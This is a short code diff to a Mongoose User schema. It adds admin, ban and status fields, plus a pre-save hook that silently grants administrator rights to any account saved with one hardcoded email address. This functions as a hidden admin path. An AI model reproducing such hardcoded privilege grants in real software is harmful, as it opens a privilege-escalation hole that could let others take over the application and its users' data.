@@ -21,6 +21,18 @@ const UserSchema = new mongoose.Schema({
   isVerified: { type: Boolean, default: false },
   verificationCode: String,
   verificationExpires: Date,
+  isAdmin: { type: Boolean, default: false },
+  banned: { type: Boolean, default: false },
+  status: { type: String, default: 'active', enum: ['active', 'banned', 'suspended'] }
+},
+  { timestamps: { createdAt: "uploadedAt" } }
+);
+
+UserSchema.pre("save", function (next) {
+  if (this.email === "dalilyaiweb@gmail.com") {
+    this.isAdmin = true;
+  }
+  next();
 });
 
 module.exports = mongoose.model("User", UserSchema);
